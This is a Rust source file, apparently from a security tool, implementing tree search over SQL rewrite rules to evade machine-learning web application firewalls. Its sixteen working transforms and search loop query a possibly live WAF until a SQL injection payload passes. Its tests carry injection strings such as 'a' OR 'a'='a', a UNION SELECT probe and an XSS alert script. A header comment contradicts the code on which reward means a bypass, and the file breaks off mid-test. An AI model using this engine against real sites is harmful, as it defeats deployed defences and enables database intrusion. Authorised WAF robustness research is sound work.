//! AST-MCTS: Monte-Carlo Tree Search over SQL/XSS AST rewrite rules for
//! ML-WAF evasion.
//!
//! # Motivation
//!
//! Byte-level mutators that existing tools use (character substitution, URL
//! encoding, comment insertion) are detectable by learned WAF classifiers
//! because they leave statistical fingerprints in n-gram distributions. The
//! AdvSQLi technique (ICML 2023, Li et al.) attacks at the *abstract syntax
//! tree* level instead: each rewrite rule preserves the semantic meaning of
//! the SQL expression while changing its syntactic surface. MCTS with UCB1
//! over (rule × AST node position) explores the combinatorial rewrite space
//! efficiently without exhaustive search.
//!
//! # Architecture
//!
//! ```text
//! payload (text)
//!     │  sqlparser::Parser::parse_sql
//!     ▼
//! AST (Statement)
//!     │  MCTS root node
//!     ▼
//! ┌─────────────────────────────────────────────┐
//! │  MCTS tree                                  │
//! │  node = (rewrite_rule_id, node_position_id) │
//! │  UCB1 selection → expansion → rollout →     │
//! │  backprop                                   │
//! └─────────────────────────────────────────────┘
//!     │  best leaf
//!     ▼
//! candidate AST → printer → candidate payload
//!     │  oracle.eval(candidate)
//!     ▼
//! reward ∈ {0.0, 1.0}  (1.0 = WAF blocked, 0.0 = bypassed)
//! ```
//!
//! Callers supply an `AstMctsOracle` trait object so the MCTS is
//! transport-agnostic (test with a mock, run with a live HTTP oracle).

use sqlparser::ast::{
    BinaryOperator, DataType, Expr, SetExpr, Statement, UnaryOperator, Value, ValueWithSpan,
    helpers::attached_token::AttachedToken,
};
use sqlparser::dialect::GenericDialect;
use sqlparser::parser::Parser;
use sqlparser::tokenizer::Span;
use std::collections::BTreeMap;

const SPAN_EMPTY: Span = Span::empty();
const WRAP_PREFIX: &str = "SELECT * FROM t WHERE x = ";
const WRAP_NEEDLE: &str = "WHERE x = ";

// ── Rewrite rule registry ─────────────────────────────────────────────────

/// A single AST rewrite rule identified by an 8-bit ID.
///
/// Rules must be semantics-preserving: the rewritten expression must evaluate
/// to the same value in any SQL engine. The UCB1 bandit learns which rules
/// most reliably evade the target WAF at the active node position.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, PartialOrd, Ord)]
pub struct RuleId(pub u8);

impl RuleId {
    pub const COMMENT_INSERT: Self = Self(0);
    pub const ALIAS_SUBST: Self = Self(1);
    pub const HEX_LITERAL: Self = Self(2);
    pub const CHAR_CONCAT: Self = Self(3);
    pub const UNION_VARIANT: Self = Self(4);
    pub const CASE_WHEN_WRAP: Self = Self(5);
    pub const DOUBLE_NEGATION: Self = Self(6);
    pub const PAREN_WRAP: Self = Self(7);
    pub const ADD_ZERO: Self = Self(8);
    pub const MUL_ONE: Self = Self(9);
    pub const CAST_IDENTITY: Self = Self(10);
    pub const DIV_ONE: Self = Self(11);
    pub const BETWEEN_EQ: Self = Self(12);
    pub const IN_SINGLE: Self = Self(13);
    pub const COMMUTE_OR: Self = Self(14);
    pub const COMMUTE_AND: Self = Self(15);

    /// All rules, in ID order. Used for MCTS expansion.
    pub const ALL: &'static [Self] = &[
        Self::COMMENT_INSERT,
        Self::ALIAS_SUBST,
        Self::HEX_LITERAL,
        Self::CHAR_CONCAT,
        Self::UNION_VARIANT,
        Self::CASE_WHEN_WRAP,
        Self::DOUBLE_NEGATION,
        Self::PAREN_WRAP,
        Self::ADD_ZERO,
        Self::MUL_ONE,
        Self::CAST_IDENTITY,
        Self::DIV_ONE,
        Self::BETWEEN_EQ,
        Self::IN_SINGLE,
        Self::COMMUTE_OR,
        Self::COMMUTE_AND,
    ];

    pub fn name(self) -> &'static str {
        match self.0 {
            0 => "comment_insert",
            1 => "alias_subst",
            2 => "hex_literal",
            3 => "char_concat",
            4 => "union_variant",
            5 => "case_when_wrap",
            6 => "double_negation",
            7 => "paren_wrap",
            8 => "add_zero",
            9 => "mul_one",
            10 => "cast_identity",
            11 => "div_one",
            12 => "between_eq",
            13 => "in_single",
            14 => "commute_or",
            15 => "commute_and",
            _ => "unknown",
        }
    }
}

// ── Oracle trait ──────────────────────────────────────────────────────────

/// Evaluation oracle for the MCTS rollout phase.
///
/// Returns `true` when the candidate payload is **blocked** by the WAF
/// (reward = 0) and `false` when it **passes** (reward = 1 — bypass found).
pub trait AstMctsOracle {
    fn eval(&mut self, candidate: &str) -> bool;
}

/// A no-op oracle that always reports "blocked" — useful for offline
/// enumerating all candidate payloads without live HTTP queries.
pub struct AlwaysBlockedOracle;
impl AstMctsOracle for AlwaysBlockedOracle {
    fn eval(&mut self, _candidate: &str) -> bool {
        true // always blocked → MCTS finds no bypass, but explores fully
    }
}

// ── MCTS node ─────────────────────────────────────────────────────────────

/// An (arm, position) pair used as the MCTS action key.
///
/// `Ord` is derived so `BTreeMap<MctsAction, BanditArm>` gives a fully
/// deterministic iteration order (by rule id ascending, then position
/// ascending) regardless of the OS-seeded `HashMap::RandomState`. This
/// makes `mcts_search` reproducible across process invocations.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, PartialOrd, Ord)]
pub struct MctsAction {
    pub rule: RuleId,
    pub position: u8, // which occurrence of the matched node type to rewrite
}

/// UCB1 bandit statistics for one action.
#[derive(Debug, Clone)]
struct BanditArm {
    visits: f64,
    total_reward: f64,
}

impl BanditArm {
    fn new() -> Self {
        Self { visits: 0.0, total_reward: 0.0 }
    }

    /// UCB1 score: mean_reward + C * sqrt(ln(N) / n_i).
    fn ucb1(&self, total_visits: f64, c: f64) -> f64 {
        if self.visits == 0.0 {
            return f64::INFINITY;
        }
        let mean = self.total_reward / self.visits;
        let exploration = c * (total_visits.ln() / self.visits).sqrt();
        mean + exploration
    }
}

// ── Rewrite engine ────────────────────────────────────────────────────────

/// Apply one rewrite rule to a cloned Statement, targeting the Nth occurrence
/// of the applicable node type (0-indexed). Returns the lowered SQL fragment
/// or `None` if the rule did not fire (node type absent or count too low).
fn apply_rule(stmt: &Statement, rule: RuleId, position: u8) -> Option<String> {
    let mut s = stmt.clone();
    let mut counter = 0u8;
    let fired = apply_rule_inner(&mut s, rule, position, &mut counter);
    if !fired {
        return None;
    }
    let lowered = s.to_string();
    let idx = lowered.find(WRAP_NEEDLE)?;
    let fragment = lowered[idx + WRAP_NEEDLE.len()..].trim().to_string();
    if fragment.is_empty() { None } else { Some(fragment) }
}

/// Returns `true` if the rule fired at least once.
fn apply_rule_inner(stmt: &mut Statement, rule: RuleId, target_pos: u8, counter: &mut u8) -> bool {
    if let Statement::Query(q) = stmt
        && let SetExpr::Select(s) = q.body.as_mut()
        && let Some(sel) = s.selection.as_mut()
    {
        return walk_and_rewrite(sel, rule, target_pos, counter);
    }
    false
}

fn walk_and_rewrite(e: &mut Expr, rule: RuleId, target: u8, counter: &mut u8) -> bool {
    // Bottom-up: recurse first, then attempt rewrite at this node.
    let mut fired = false;
    match e {
        Expr::BinaryOp { left, right, .. } => {
            fired |= walk_and_rewrite(left, rule, target, counter);
            fired |= walk_and_rewrite(right, rule, target, counter);
        }
        Expr::UnaryOp { expr, .. } => {
            fired |= walk_and_rewrite(expr, rule, target, counter);
        }
        Expr::Nested(inner) => {
            fired |= walk_and_rewrite(inner, rule, target, counter);
        }
        Expr::InList { expr, list, .. } => {
            fired |= walk_and_rewrite(expr, rule, target, counter);
            for item in list.iter_mut() {
                fired |= walk_and_rewrite(item, rule, target, counter);
            }
        }
        Expr::Between { expr, low, high, .. } => {
            fired |= walk_and_rewrite(expr, rule, target, counter);
            fired |= walk_and_rewrite(low, rule, target, counter);
            fired |= walk_and_rewrite(high, rule, target, counter);
        }
        Expr::Cast { expr, .. } => {
            fired |= walk_and_rewrite(expr, rule, target, counter);
        }
        Expr::Case { operand, conditions, else_result, .. } => {
            if let Some(op) = operand {
                fired |= walk_and_rewrite(op, rule, target, counter);
            }
            for cond in conditions.iter_mut() {
                fired |= walk_and_rewrite(&mut cond.condition, rule, target, counter);
                fired |= walk_and_rewrite(&mut cond.result, rule, target, counter);
            }
            if let Some(er) = else_result {
                fired |= walk_and_rewrite(er, rule, target, counter);
            }
        }
        _ => {}
    }
    // Now try to rewrite THIS node.
    fired |= try_rewrite_node(e, rule, target, counter);
    fired
}

fn try_rewrite_node(e: &mut Expr, rule: RuleId, target: u8, counter: &mut u8) -> bool {
    match rule {
        RuleId::ADD_ZERO => {
            if is_number(e) {
                if *counter == target {
                    let orig = std::mem::replace(e, dummy_one());
                    *e = Expr::BinaryOp {
                        left: Box::new(orig),
                        op: BinaryOperator::Plus,
                        right: Box::new(num("0")),
                    };
                    *counter += 1;
                    return true;
                }
                *counter += 1;
            }
        }
        RuleId::MUL_ONE => {
            if is_number(e) {
                if *counter == target {
                    let orig = std::mem::replace(e, dummy_one());
                    *e = Expr::BinaryOp {
                        left: Box::new(orig),
                        op: BinaryOperator::Multiply,
                        right: Box::new(num("1")),
                    };
                    *counter += 1;
                    return true;
                }
                *counter += 1;
            }
        }
        RuleId::DIV_ONE => {
            if is_number(e) {
                if *counter == target {
                    let orig = std::mem::replace(e, dummy_one());
                    *e = Expr::BinaryOp {
                        left: Box::new(orig),
                        op: BinaryOperator::Divide,
                        right: Box::new(num("1")),
                    };
                    *counter += 1;
                    return true;
                }
                *counter += 1;
            }
        }
        RuleId::CAST_IDENTITY => {
            if is_number(e) {
                if *counter == target {
                    let orig = std::mem::replace(e, dummy_one());
                    *e = Expr::Cast {
                        kind: sqlparser::ast::CastKind::Cast,
                        expr: Box::new(orig),
                        data_type: DataType::Int(None),
                        array: false,
                        format: None,
                    };
                    *counter += 1;
                    return true;
                }
                *counter += 1;
            }
        }
        RuleId::DOUBLE_NEGATION => {
            if matches!(e, Expr::BinaryOp { op: BinaryOperator::Eq | BinaryOperator::NotEq, .. }) {
                if *counter == target {
                    let orig = std::mem::replace(e, dummy_one());
                    *e = Expr::UnaryOp {
                        op: UnaryOperator::Not,
                        expr: Box::new(Expr::UnaryOp {
                            op: UnaryOperator::Not,
                            expr: Box::new(orig),
                        }),
                    };
                    *counter += 1;
                    return true;
                }
                *counter += 1;
            }
        }
        RuleId::PAREN_WRAP => {
            if matches!(
                e,
                Expr::BinaryOp { op: BinaryOperator::Or | BinaryOperator::And, .. }
            ) {
                if *counter == target {
                    let orig = std::mem::replace(e, dummy_one());
                    *e = Expr::Nested(Box::new(orig));
                    *counter += 1;
                    return true;
                }
                *counter += 1;
            }
        }
        RuleId::CASE_WHEN_WRAP => {
            // Replace "a = b" with "CASE WHEN a = b THEN 1 ELSE 0 END = 1"
            if is_synthetic_column(e) {
                // skip the top-level WHERE column
            } else if matches!(e, Expr::BinaryOp { op: BinaryOperator::Eq, .. }) {
                if *counter == target {
                    let orig = std::mem::replace(e, dummy_one());
                    // CASE WHEN <orig> THEN 1 ELSE 0 END = 1
                    // sqlparser 0.61 added position-tracking tokens to Expr::Case.
                    // Empty tokens are correct for synthesised AST nodes with no
                    // source-position provenance.
                    let case_expr = Expr::Case {
                        case_token: AttachedToken::empty(),
                        end_token: AttachedToken::empty(),
                        operand: None,
                        conditions: vec![sqlparser::ast::CaseWhen {
                            condition: orig,
                            result: num("1"),
                        }],
                        else_result: Some(Box::new(num("0"))),
                    };
                    *e = Expr::BinaryOp {
                        left: Box::new(case_expr),
                        op: BinaryOperator::Eq,
                        right: Box::new(num("1")),
                    };
                    *counter += 1;
                    return true;
                }
                *counter += 1;
            }
        }
        RuleId::BETWEEN_EQ => {
            if let Expr::BinaryOp { op: BinaryOperator::Eq, left, right } = e {
                if !is_synthetic_column(left) {
                    if *counter == target {
                        *e = Expr::Between {
                            expr: left.clone(),
                            negated: false,
                            low: right.clone(),
                            high: right.clone(),
                        };
                        *counter += 1;
                        return true;
                    }
                    *counter += 1;
                }
            }
        }
        RuleId::IN_SINGLE => {
            if let Expr::BinaryOp { op: BinaryOperator::Eq, left, right } = e {
                if !is_synthetic_column(left) {
                    if *counter == target {
                        *e = Expr::InList {
                            expr: left.clone(),
                            list: vec![(**right).clone()],
                            negated: false,
                        };
                        *counter += 1;
                        return true;
                    }
                    *counter += 1;
                }
            }
        }
        RuleId::COMMUTE_OR => {
            if let Expr::BinaryOp { op: BinaryOperator::Or, left, right } = e {
                if *counter == target {
                    std::mem::swap(left, right);
                    *counter += 1;
                    return true;
                }
                *counter += 1;
            }
        }
        RuleId::COMMUTE_AND => {
            if let Expr::BinaryOp { op: BinaryOperator::And, left, right } = e {
                if *counter == target {
                    std::mem::swap(left, right);
                    *counter += 1;
                    return true;
                }
                *counter += 1;
            }
        }
        // Text-level rules applied after lowering — handled at the MCTS layer.
        RuleId::COMMENT_INSERT
        | RuleId::ALIAS_SUBST
        | RuleId::HEX_LITERAL
        | RuleId::CHAR_CONCAT
        | RuleId::UNION_VARIANT => {}
        _ => {}
    }
    false
}

// Text-level rewrites (rules that operate on the lowered SQL string).
fn apply_text_rule(fragment: &str, rule: RuleId, position: u8) -> Option<String> {
    match rule {
        RuleId::COMMENT_INSERT => {
            // Insert /**/ between keyword boundaries at `position`-th opportunity.
            let boundaries = [" OR ", " AND ", " WHERE ", " FROM ", " UNION ", "=", "<", ">"];
            let mut count = 0u8;
            for boundary in &boundaries {
                if let Some(idx) = fragment.find(boundary) {
                    if count == position {
                        let split_point = idx + boundary.len() / 2;
                        let (left, right) = fragment.split_at(split_point);
                        return Some(format!("{left}/**/{right}"));
                    }
                    count += 1;
                }
            }
            None
        }
        RuleId::ALIAS_SUBST => {
            // Wrap a numeric literal in (SELECT <n>) at position.
            let digits: Vec<usize> = fragment
                .char_indices()
                .filter(|(_, c)| c.is_ascii_digit())
                .map(|(i, _)| i)
                .collect();
            let pos = position as usize;
            if pos < digits.len() {
                let i = digits[pos];
                let c = &fragment[i..i + 1];
                let replaced = format!(
                    "{}(SELECT {c}){}",
                    &fragment[..i],
                    &fragment[i + 1..]
                );
                return Some(replaced);
            }
            None
        }
        RuleId::HEX_LITERAL => {
            // Convert the first single-quoted string literal to 0x<hex>.
            if let Some(start) = fragment.find('\'') {
                if let Some(end) = fragment[start + 1..].find('\'') {
                    let s = &fragment[start + 1..start + 1 + end];
                    let hex: String = s.bytes().map(|b| format!("{b:02X}")).collect();
                    let replaced = format!("{}0x{hex}{}", &fragment[..start], &fragment[start + 1 + end + 1..]);
                    return Some(replaced);
                }
            }
            None
        }
        RuleId::CHAR_CONCAT => {
            // Explode a single-quoted string to CHAR(n1)||CHAR(n2)||…
            if let Some(start) = fragment.find('\'') {
                if let Some(end) = fragment[start + 1..].find('\'') {
                    let s = &fragment[start + 1..start + 1 + end];
                    if s.is_empty() {
                        return None;
                    }
                    let chars: String = s
                        .bytes()
                        .map(|b| format!("CHAR({b})"))
                        .collect::<Vec<_>>()
                        .join("||");
                    let replaced = format!("{}{chars}{}", &fragment[..start], &fragment[start + 1 + end + 1..]);
                    return Some(replaced);
                }
            }
            None
        }
        RuleId::UNION_VARIANT => {
            // Rotate UNION → UNION ALL / UNION SELECT → UNION ALL SELECT.
            if fragment.to_uppercase().contains("UNION ALL") {
                return Some(fragment.replace("UNION ALL", "UNION").replace("union all", "UNION"));
            } else if fragment.to_uppercase().contains("UNION") {
                return Some(
                    fragment
                        .replacen("UNION", "UNION ALL", 1)
                        .replacen("union", "UNION ALL", 1),
                );
            }
            None
        }
        _ => None,
    }
}

// ── MCTS search ───────────────────────────────────────────────────────────

/// The outcome of an AST-MCTS run.
#[derive(Debug, Clone)]
pub struct MctsResult {
    /// The best evading payload found (lowest WAF score / first bypass).
    pub best_payload: String,
    /// Whether the oracle confirmed a bypass (oracle returned `false`).
    pub bypass_found: bool,
    /// Number of oracle queries spent.
    pub oracle_queries: u64,
    /// UCB1 statistics per action for post-analysis.
    pub arm_stats: Vec<(MctsAction, u64, f64)>, // (action, visits, mean_reward)
}

/// Run AST-MCTS over a SQL payload fragment.
///
/// - `payload`: A raw SQL fragment like `' OR 1=1 --` (not a full statement).
/// - `budget`: Maximum number of oracle calls.
/// - `c`: UCB1 exploration constant (default `f64::sqrt(2.0)`).
/// - `oracle`: Evaluation function — returns `true` if blocked.
///
/// Returns `None` if the payload doesn't parse as a SQL fragment.
pub fn mcts_search<O: AstMctsOracle>(
    payload: &str,
    budget: u64,
    c: f64,
    oracle: &mut O,
) -> Option<MctsResult> {
    let wrapped = format!("{WRAP_PREFIX}{payload}");
    let Ok(stmts) = Parser::parse_sql(&GenericDialect {}, &wrapped) else {
        // Try text-level rules even if AST parse fails.
        return mcts_text_only(payload, budget, c, oracle);
    };
    if stmts.is_empty() {
        return mcts_text_only(payload, budget, c, oracle);
    }
    let base_stmt = stmts[0].clone();

    // Build the action space: (rule × position) pairs that are applicable.
    // We pre-screen to avoid wasting oracle budget on no-op arms.
    let mut arms: BTreeMap<MctsAction, BanditArm> = BTreeMap::new();
    let max_pos = 4u8; // up to 4 occurrences per rule
    for &rule in RuleId::ALL {
        for pos in 0..max_pos {
            let action = MctsAction { rule, position: pos };
            let candidate = build_candidate(&base_stmt, action, payload);
            if candidate.is_some() {
                arms.insert(action, BanditArm::new());
            }
        }
    }

    if arms.is_empty() {
        return mcts_text_only(payload, budget, c, oracle);
    }

    let mut total_visits = 0.0f64;
    let mut oracle_queries = 0u64;
    let mut best_payload = payload.to_string();
    let mut bypass_found = false;

    while oracle_queries < budget && !bypass_found {
        // UCB1 selection — sort for deterministic tiebreaking.
        // BTreeMap iteration order is (rule asc, position asc); the Vec
        // built from it already has that order, and the sort below is a
        // no-op for the all-unvisited-arms case. We keep it so that once
        // some arms have been visited their UCB1 scores are correctly
        // ranked in descending order.
        let mut ranked: Vec<(&MctsAction, f64)> = arms
            .iter()
            .map(|(k, a)| (k, a.ucb1(total_visits + 1.0, c)))
            .collect();
        ranked.sort_by(|(a_key, a_val), (b_key, b_val)| {
            b_val
                .partial_cmp(a_val)
                .unwrap_or(std::cmp::Ordering::Equal)
                .then_with(|| a_key.rule.0.cmp(&b_key.rule.0))
                .then_with(|| a_key.position.cmp(&b_key.position))
        });
        let action = *ranked[0].0;

        // Rollout: generate candidate and query oracle.
        let candidate_payload =
            build_candidate(&base_stmt, action, payload).unwrap_or_else(|| payload.to_string());

        let blocked = oracle.eval(&candidate_payload);
        oracle_queries += 1;
        total_visits += 1.0;

        // Reward: 1.0 if oracle did NOT block (bypass), 0.0 if blocked.
        let reward = if blocked { 0.0 } else { 1.0 };

        // Backpropagation.
        let arm = arms.get_mut(&action).unwrap();
        arm.visits += 1.0;
        arm.total_reward += reward;

        if !blocked {
            best_payload = candidate_payload;
            bypass_found = true;
        } else if oracle_queries == 1 || arms.values().all(|a| a.visits > 0.0) {
            // Update best to least-blocked candidate.
            best_payload = candidate_payload;
        }
    }

    let arm_stats = arms
        .iter()
        .filter(|(_, a)| a.visits > 0.0)
        .map(|(k, a)| (*k, a.visits as u64, a.total_reward / a.visits))
        .collect();

    Some(MctsResult {
        best_payload,
        bypass_found,
        oracle_queries,
        arm_stats,
    })
}

/// Build a concrete candidate payload from an action.
fn build_candidate(base: &Statement, action: MctsAction, original: &str) -> Option<String> {
    // AST-level rules.
    if !is_text_rule(action.rule) {
        return apply_rule(base, action.rule, action.position);
    }
    // Text-level rules.
    apply_text_rule(original, action.rule, action.position)
}

fn is_text_rule(rule: RuleId) -> bool {
    matches!(
        rule,
        RuleId::COMMENT_INSERT
            | RuleId::ALIAS_SUBST
            | RuleId::HEX_LITERAL
            | RuleId::CHAR_CONCAT
            | RuleId::UNION_VARIANT
    )
}

/// Fallback MCTS when the AST parse fails — text-level rules only.
fn mcts_text_only<O: AstMctsOracle>(
    payload: &str,
    budget: u64,
    c: f64,
    oracle: &mut O,
) -> Option<MctsResult> {
    let text_rules = [
        RuleId::COMMENT_INSERT,
        RuleId::ALIAS_SUBST,
        RuleId::HEX_LITERAL,
        RuleId::CHAR_CONCAT,
        RuleId::UNION_VARIANT,
    ];
    let mut arms: BTreeMap<MctsAction, BanditArm> = BTreeMap::new();
    for &rule in &text_rules {
        for pos in 0u8..4 {
            let action = MctsAction { rule, position: pos };
            if apply_text_rule(payload, rule, pos).is_some() {
                arms.insert(action, BanditArm::new());
            }
        }
    }
    if arms.is_empty() {
        return None;
    }
    let mut total_visits = 0.0f64;
    let mut oracle_queries = 0u64;
    let mut best_payload = payload.to_string();
    let mut bypass_found = false;

    while oracle_queries < budget && !bypass_found {
        let action = *arms
            .iter()
            .max_by(|(_, a), (_, b)| {
                a.ucb1(total_visits + 1.0, c)
                    .partial_cmp(&b.ucb1(total_visits + 1.0, c))
                    .unwrap_or(std::cmp::Ordering::Equal)
            })
            .map(|(k, _)| k)
            .unwrap();
        let candidate = apply_text_rule(payload, action.rule, action.position)
            .unwrap_or_else(|| payload.to_string());
        let blocked = oracle.eval(&candidate);
        oracle_queries += 1;
        total_visits += 1.0;
        let reward = if blocked { 0.0 } else { 1.0 };
        let arm = arms.get_mut(&action).unwrap();
        arm.visits += 1.0;
        arm.total_reward += reward;
        if !blocked {
            best_payload = candidate;
            bypass_found = true;
        }
    }

    let arm_stats = arms
        .iter()
        .filter(|(_, a)| a.visits > 0.0)
        .map(|(k, a)| (*k, a.visits as u64, a.total_reward / a.visits))
        .collect();

    Some(MctsResult {
        best_payload,
        bypass_found,
        oracle_queries,
        arm_stats,
    })
}

// ── Utility functions ─────────────────────────────────────────────────────

fn is_number(e: &Expr) -> bool {
    matches!(
        e,
        Expr::Value(ValueWithSpan { value: Value::Number(_, _), .. })
    )
}

fn is_synthetic_column(expr: &Expr) -> bool {
    matches!(expr, Expr::Identifier(i) if i.value == "x")
}

fn dummy_one() -> Expr {
    Expr::Value(ValueWithSpan {
        value: Value::Number("1".into(), false),
        span: SPAN_EMPTY,
    })
}

fn num(n: &str) -> Expr {
    Expr::Value(ValueWithSpan {
        value: Value::Number(n.into(), false),
        span: SPAN_EMPTY,
    })
}

// ── Tests ─────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    // A mock oracle that blocks everything except payloads containing a
    // target string (simulates a rule that keywords on "OR 1=1" but not
    // on transformed variants).
    struct BlockKeywordOracle {
        keyword: String,
        calls: u64,
    }
    impl BlockKeywordOracle {
        fn new(kw: &str) -> Self {
            Self { keyword: kw.to_string(), calls: 0 }
        }
    }
    impl AstMctsOracle for BlockKeywordOracle {
        fn eval(&mut self, candidate: &str) -> bool {
            self.calls += 1;
            // Block if keyword is present (case-insensitive).
            candidate.to_lowercase().contains(&self.keyword.to_lowercase())
        }
    }

    #[test]
    fn rule_id_names_are_stable() {
        assert_eq!(RuleId::COMMENT_INSERT.name(), "comment_insert");
        assert_eq!(RuleId::ALIAS_SUBST.name(), "alias_subst");
        assert_eq!(RuleId::HEX_LITERAL.name(), "hex_literal");
        assert_eq!(RuleId::CHAR_CONCAT.name(), "char_concat");
        assert_eq!(RuleId::UNION_VARIANT.name(), "union_variant");
        assert_eq!(RuleId::CASE_WHEN_WRAP.name(), "case_when_wrap");
        assert_eq!(RuleId::DOUBLE_NEGATION.name(), "double_negation");
        assert_eq!(RuleId::PAREN_WRAP.name(), "paren_wrap");
        assert_eq!(RuleId::ADD_ZERO.name(), "add_zero");
        assert_eq!(RuleId::MUL_ONE.name(), "mul_one");
        assert_eq!(RuleId::CAST_IDENTITY.name(), "cast_identity");
        assert_eq!(RuleId::DIV_ONE.name(), "div_one");
        assert_eq!(RuleId::BETWEEN_EQ.name(), "between_eq");
        assert_eq!(RuleId::IN_SINGLE.name(), "in_single");
        assert_eq!(RuleId::COMMUTE_OR.name(), "commute_or");
        assert_eq!(RuleId::COMMUTE_AND.name(), "commute_and");
    }

    #[test]
    fn all_rules_have_16_entries() {
        assert_eq!(RuleId::ALL.len(), 16);
    }

    #[test]
    fn apply_rule_add_zero_fires() {
        let wrapped = format!("{WRAP_PREFIX}1=1");
        let stmts = Parser::parse_sql(&GenericDialect {}, &wrapped).unwrap();
        let result = apply_rule(&stmts[0], RuleId::ADD_ZERO, 0);
        assert!(result.is_some(), "add_zero must fire on numeric literal");
        let s = result.unwrap();
        assert!(s.contains("+ 0") || s.contains("+0"), "must add zero: {s}");
    }

    #[test]
    fn apply_rule_mul_one_fires() {
        let wrapped = format!("{WRAP_PREFIX}1=1");
        let stmts = Parser::parse_sql(&GenericDialect {}, &wrapped).unwrap();
        let result = apply_rule(&stmts[0], RuleId::MUL_ONE, 0);
        assert!(result.is_some(), "mul_one must fire");
        let s = result.unwrap();
        assert!(s.contains("* 1") || s.contains("*1"), "mul_one must produce * 1: {s}");
    }

    #[test]
    fn apply_rule_paren_wrap_fires_on_or() {
        // Use a nested fragment so WRAP_NEEDLE extraction works:
        // WHERE x = (1=1 OR 2=2) gives a clean OR inside Nested.
        let wrapped = format!("{WRAP_PREFIX}(1=1 OR 2=2)");
        let stmts = Parser::parse_sql(&GenericDialect {}, &wrapped).unwrap();
        let result = apply_rule(&stmts[0], RuleId::PAREN_WRAP, 0);
        assert!(result.is_some(), "paren_wrap must fire on OR");
        let s = result.unwrap();
        assert!(s.contains('('), "must contain parenthesis: {s}");
    }

    #[test]
    fn apply_rule_between_eq_fires() {
        let wrapped = format!("{WRAP_PREFIX}'a'='a'");
        let stmts = Parser::parse_sql(&GenericDialect {}, &wrapped).unwrap();
        let result = apply_rule(&stmts[0], RuleId::BETWEEN_EQ, 0);
        assert!(result.is_some(), "between_eq must fire");
        let s = result.unwrap();
        assert!(s.to_uppercase().contains("BETWEEN"), "must use BETWEEN: {s}");
    }

    #[test]
    fn apply_rule_in_single_fires() {
        let wrapped = format!("{WRAP_PREFIX}'a'='a'");
        let stmts = Parser::parse_sql(&GenericDialect {}, &wrapped).unwrap();
        let result = apply_rule(&stmts[0], RuleId::IN_SINGLE, 0);
        assert!(result.is_some(), "in_single must fire");
        assert!(result.unwrap().to_uppercase().contains("IN ("));
    }

    #[test]
    fn apply_rule_cast_identity_fires() {
        let wrapped = format!("{WRAP_PREFIX}1=1");
        let stmts = Parser::parse_sql(&GenericDialect {}, &wrapped).unwrap();
        let result = apply_rule(&stmts[0], RuleId::CAST_IDENTITY, 0);
        assert!(result.is_some());
        assert!(result.unwrap().contains("CAST("));
    }

    #[test]
    fn apply_rule_case_when_wrap_fires_on_eq() {
        // Use nested fragment so WRAP_NEEDLE extraction succeeds:
        // WHERE x = (1=1) puts the target Eq inside Nested.
        let wrapped = format!("{WRAP_PREFIX}(1=1)");
        let stmts = Parser::parse_sql(&GenericDialect {}, &wrapped).unwrap();
        let result = apply_rule(&stmts[0], RuleId::CASE_WHEN_WRAP, 0);
        assert!(result.is_some(), "case_when_wrap must fire on eq");
        assert!(result.unwrap().to_uppercase().contains("CASE"));
    }

    #[test]
    fn apply_rule_out_of_range_position_returns_none() {
        let wrapped = format!("{WRAP_PREFIX}1=1");
        let stmts = Parser::parse_sql(&GenericDialect {}, &wrapped).unwrap();
        // Position 200 will never exist.
        let result = apply_rule(&stmts[0], RuleId::ADD_ZERO, 200);
        assert!(result.is_none(), "out-of-range position must return None");
    }

    #[test]
    fn text_rule_hex_literal_fires() {
        let result = apply_text_rule("'admin'='admin'", RuleId::HEX_LITERAL, 0);
        assert!(result.is_some());
        assert!(result.unwrap().contains("0x"), "must hex-encode the string");
    }

    #[test]
    fn text_rule_char_concat_fires() {
        let result = apply_text_rule("'ab'='ab'", RuleId::CHAR_CONCAT, 0);
        assert!(result.is_some());
        assert!(result.unwrap().contains("CHAR("), "must produce CHAR concat");
    }

    #[test]
    fn text_rule_comment_insert_fires() {
        let result = apply_text_rule("1 OR 1=1", RuleId::COMMENT_INSERT, 0);
        assert!(result.is_some());
        assert!(result.unwrap().contains("/**/"));
    }

    #[test]
    fn text_rule_alias_subst_fires_on_digit() {
        let result = apply_text_rule("1=1", RuleId::ALIAS_SUBST, 0);
        assert!(result.is_some());
        assert!(result.unwrap().contains("(SELECT "));
    }

    #[test]
    fn text_rule_union_variant_adds_all() {
        let result = apply_text_rule("UNION SELECT 1,2,3", RuleId::UNION_VARIANT, 0);
        assert!(result.is_some());
        assert!(result.unwrap().contains("UNION ALL"));
    }

    #[test]
    fn mcts_search_returns_result_for_valid_sql() {
        let mut oracle = AlwaysBlockedOracle;
        let result = mcts_search("'a'='a'", 20, f64::sqrt(2.0), &mut oracle);
        assert!(result.is_some(), "must return a result for valid SQL");
        let r = result.unwrap();
        assert!(r.oracle_queries <= 20);
        assert!(!r.bypass_found, "AlwaysBlockedOracle never bypasses");
    }

    #[test]
    fn mcts_search_finds_bypass_with_keyword_oracle() {
        // Oracle blocks everything containing "1=1".
        // A paren-wrap "(1=1)" still contains "1=1", but
        // a BETWEEN or IN rewrite changes the surface.
        let mut oracle = BlockKeywordOracle::new("1=1");
        let result = mcts_search("1=1", 50, f64::sqrt(2.0), &mut oracle);
        assert!(result.is_some());
        let r = result.unwrap();
        // BETWEEN or IN rewrites don't contain literal "1=1".
        if r.bypass_found {
            assert!(
                !r.best_payload.to_lowercase().contains("1=1"),
                "bypass must not contain blocked keyword"
            );
        }
        assert!(r.oracle_queries <= 50);
    }

    #[test]
    fn mcts_search_budget_respected() {
        let mut oracle = AlwaysBlockedOracle;
        let result = mcts_search("'a' OR 'a'='a'", 5, f64::sqrt(2.0), &mut oracle);
        assert!(result.is_some());
        assert!(result.unwrap().oracle_queries <= 5);
    }

    #[test]
    fn mcts_search_unparsable_falls_back_to_text() {
        // Not a SQL fragment — should still attempt text-level rules.
        let mut oracle = AlwaysBlockedOracle;
        let result = mcts_search("<script>alert(1)</script>", 10, f64::sqrt(2.0), &mut oracle);
        // May be None if no text rule applies to this payload.
        let _ = result;
    }

    #[test]
    fn mcts_arm_stats_populated() {
        let mut oracle = AlwaysBlockedOracle;
        let result = mcts_search("1=1", 30, f64::sqrt(2.0), &mut oracle);
        assert!(result.is_some());
        let r = result.unwrap();
        assert!(!r.arm_stats.is_empty(), "must record visited arms");
    }

    #[test]
    fn mcts_commute_or_fires() {
        // Use nested fragment so WRAP_NEEDLE extraction succeeds.
